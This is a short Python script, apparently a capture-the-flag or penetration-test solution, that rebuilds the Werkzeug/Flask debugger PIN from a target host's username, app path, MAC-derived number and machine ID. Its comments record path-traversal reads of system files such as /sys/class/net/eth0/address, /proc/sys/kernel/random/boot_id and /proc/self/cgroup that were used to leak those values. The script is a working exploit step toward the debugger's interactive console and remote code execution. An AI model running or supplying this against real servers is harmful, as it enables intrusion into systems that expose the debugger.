import hashlib
from itertools import chain

rv = None
num = None

probably_public_bits = [
    'anonim',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/home/anonim/.local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), or make an error
]

private_bits = [
    '2485378744322',# str(uuid.getnode()), ../../../../../sys/class/net/eth0/address    
    '495bb6a5-2be6-4112-9413-c56e2207d2efd5cc68d1379987b8c8190560f7d9a4542b9c57b97748ae320e16d0e85f05836f'# get_machine_id(), ../../../../proc/sys/kernel/random/boot_id + ../../../../proc/self/cgroup
]


h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
print(rv)